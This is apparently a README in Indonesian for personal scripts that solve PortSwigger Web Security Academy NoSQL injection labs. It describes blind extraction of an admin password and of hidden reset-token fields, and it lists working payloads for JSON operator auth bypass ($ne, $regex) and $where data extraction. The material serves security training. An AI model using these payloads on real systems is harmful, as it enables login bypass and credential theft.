# PortSwigger NoSQL Injection tools

Scripts untuk PortSwigger Web Security Academy — NoSQL injection labs. Simpan di sini agar mudah dipanggil ulang; sesuaikan `URL`, `COOKIE/session`, `FIELD`, dan `CHARSET` sebelum pakai (nilai di file adalah contoh dari instance lab).

## Scripts

| Script | Lab | Teknik | Catatan |
|---|---|---|---|
| `exploit-nosql-injection-to-extract-data.py` | Lab 0.3 — Exploiting NoSQL injection to extract data | Syntax/JS injection via `user` param (`/user/lookup`): `administrator' && this.password.length == N` dan `this.password[i] == 'c'` | GET request + cookies. Ekstrak panjang lalu karakter password admin (hasil contoh: `wlnpqphm`, lowercase+digits). |
| `exploit-nosql-operator-injection-to-extract-unknown-fields-object-keys.py` | Lab 0.4 — Exploiting NoSQL operator injection to extract unknown fields (step 1) | JSON operator injection: `{"username":"carlos","password":{"$ne":"test"},"$where":"Object.keys(this)[idx].match('^.{pos}c.*')"}` | Enumerasi nama field/key dokumen user (mis. `_id, username, password, email, changePwd`). Oracle `is_true`: redirect atau respons tanpa "invalid username or password". |
| `exploit-nosql-operator-injection-to-extract-unknown-fields-length-hidden-token.py` | Lab 0.4 — Exploiting NoSQL operator injection to extract unknown fields (step 2) | `$where` dengan `this.<FIELD>.match(...)` untuk length (`^. {n}$`) dan nilai char-by-char | Set `FIELD` ke key tersembunyi hasil step 1 (contoh: `changePwd`), lalu pakai token di flow reset/change password sesuai lab. |

## Dependensi

```bash
pip install requests urllib3
```

## Catatan penggunaan

- Ganti host lab (`...web-security-academy.net`), cookie `session`, username target, dan charset sesuai kebutuhan.
- Heuristik `is_true()` bisa perlu disesuaikan dengan respons lab (redirect/location/body). Jika hasil semua `-`/`aaaaaaaa...`, cek indikator sukses/gagal.
- Lab 0.1–0.2 umumnya manual di Burp (syntax/operator injection di parameter kategori & login JSON `$regex`/`$ne`); belum ada script otomatis di folder ini.
- Screenshot & write-up: `/home/moon/Projects/Penjelajah-CyberSecurity/Port-Swigger/Web-Security-Academy/NoSQL-Injection/` (`nosql-injection-en.md`, `images/lab-0.*`).

## Quick reference payloads

- Syntax detection: `'`, `'+'` / `%2b`, boolean `' && 0 && 'x` / `' && 1 && 'x`, always-true `'||1||'` atau `'||'1'=='1`.
- Operator auth bypass (JSON): `{"username":{"$regex":"ad.*"},"password":{"$ne":""}}` atau `$in`.
- `$where` data exfil (lookup): `administrator' && this.password[i]=='a' || 'a'=='b`.
- `$where` key/value enum (login JSON): `Object.keys(this)[1].match('^.{0}a.*')`, `this.changePwd.match('^.{0}a.*')`.
